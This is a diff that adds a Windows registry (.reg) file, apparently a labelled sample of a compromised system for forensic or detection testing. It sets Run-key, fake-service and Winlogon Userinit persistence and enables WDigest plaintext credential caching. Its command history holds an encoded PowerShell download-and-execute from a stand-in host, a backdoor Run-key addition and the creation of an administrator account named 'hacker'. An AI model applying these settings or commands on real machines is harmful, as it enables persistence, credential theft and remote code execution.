@@ -1,0 +1,28 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"SecurityHealth"="C:\\Windows\\system32\\SecurityHealthSystray.exe"
+"Malware"="C:\\Users\\admin\\AppData\\Roaming\\malware.exe"
+"OneDrive"="C:\\Users\\admin\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\malwaresvc]
+"DisplayName"="Windows Update Service"
+"ImagePath"="C:\\Windows\\Temp\\malware.exe -s"
+"Start"=2
+"Type"=16
+"Description"="Malicious service disguised as Windows Update"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU]
+"a"="powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA"
+"b"="cmd /c whoami > \\192.168.1.100\share\output.txt"
+"c"="reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\\temp\\backdoor.exe" /f"
+"d"="net user hacker P@ssw0rd123 /add"
+"e"="net localgroup administrators hacker /add"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+"Shell"="explorer.exe"
+"Userinit"="C:\\Windows\\system32\\userinit.exe,C:\\Windows\\Temp\\malicious.exe"
+"VMApplet"="rundll32.exe shell32.dll,Control_RunDLL "C:\\ProgramData\\update.dll""
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest]
+"UseLogonCredential"=dword:00000001
